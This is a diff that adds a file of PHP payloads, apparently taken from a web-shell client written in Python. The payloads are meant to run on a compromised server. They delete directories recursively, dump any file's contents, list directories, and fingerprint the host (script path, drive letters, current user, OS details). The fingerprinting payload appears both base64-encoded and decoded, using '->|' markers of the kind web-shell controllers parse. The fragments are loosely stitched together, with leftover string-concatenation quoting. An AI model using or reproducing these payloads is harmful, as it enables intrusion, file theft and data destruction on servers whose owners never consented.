@@ -1,0 +1,80 @@
+﻿"function delete_directory($dirname)
+{
+	if (is_dir($dirname)) 
+		{$dir_handle = opendir($dirname);}
+	if (!$dir_handle) 
+	{
+		if(is_file($dirname)) 
+		{
+			unlink($dirname);    
+		}
+		return false;
+	}
+	while($file = readdir($dir_handle)) 
+		{
+			if ($file != \".\" && $file != \"..\") 
+			{
+				if (!is_dir($dirname.\"/\".$file)) {
+					unlink($dirname.\"/\".$file);} 
+				else{delete_directory($dirname.\'/\'.$file);}
+			}
+		}
+	closedir($dir_handle);
+	rmdir($dirname);
+	return true;
+}
+$dir = iconv(\"UTF-8\", \"GBK\", \""+dirname+"\");delete_directory($dir);"
+
+
+
+
+
+$file_path =\"" + filepath +"\";
+$fp=fopen($file_path,\"r\");
+$file_size=filesize($file_path);
+$buffer=1024;
+$file_count=0;
+while(!feof($fp) && $file_count<$file_size) 
+	{
+		$file_con=fread($fp,$buffer);
+		echo $file_con;
+	}
+fclose($fp);"
+
+
+
+
+def dols(self, ev=None)函数的data：
+$dirname=\tdir\;
+if(is_dir($dirname))
+	{
+		$dir=opendir($dirname);
+		$file="";
+		while($file=readdir($dir)){print  $file."\n" ;}
+		closedir($dir);
+	}else{print \"not a dir\";}
+
+
+
+
+
+
+
+
+
+
+QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOyREPWRpcm5hbWUoJF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdKTtpZigkRD09IiIpJEQ9ZGlybmFtZSgkX1NFUlZFUlsiUEFUSF9UUkFOU0xBVEVEIl0pO2VjaG8gJEQ7ZWNobygifDwtIik7aWYoc3Vic3RyKCRELDAsMSkhPSIvIikge2ZvcmVhY2gocmFuZ2UoIkEiLCJaIikgYXMgJEwpIGlmKGlzX2RpcigieyRMfToiKSkgJFIuPSJ7JEx9OiI7fWVjaG8oIi0+fCIpO2VjaG8gJFI7ZWNobygifDwtIik7JHU9KGZ1bmN0aW9uX2V4aXN0cygncG9zaXhfZ2V0ZWdpZCcpKT9AcG9zaXhfZ2V0cHd1aWQoQHBvc2l4X2dldGV1aWQoKSk6Jyc7JHVzcj0oJHUpPyR1WyduYW1lJ106QGdldF9jdXJyZW50X3VzZXIoKTtlY2hvKCItPnwiKTtlY2hvICR1c3I7ZWNobygifDwtIik7ZWNobygiLT58Iik7ZWNobyBwaHBfdW5hbWUoKTtlY2hvKCJ8PC0iKTtkaWUoKTsK
+
+
+@ini_set("display_errors","0");
+@set_time_limit(0);
+@set_magic_quotes_runtime(0);
+echo("->|");$D=dirname($_SERVER["SCRIPT_FILENAME"]);if($D=="")$D=dirname($_SERVER["PATH_TRANSLATED"]);echo $D;
+echo("|<-");
+if(substr($D,0,1)!="/") {foreach(range("A","Z") as $L) if(is_dir("{$L}:")) $R.="{$L}:";}
+echo("->|");
+echo $R;
+echo("|<-");
+$u=(function_exists('posix_getegid'))?@posix_getpwuid(@posix_geteuid()):'';$usr=($u)?$u['name']:@get_current_user();
+echo("->|");echo $usr;echo("|<-");
+echo("->|");echo php_uname();echo("|<-");die();
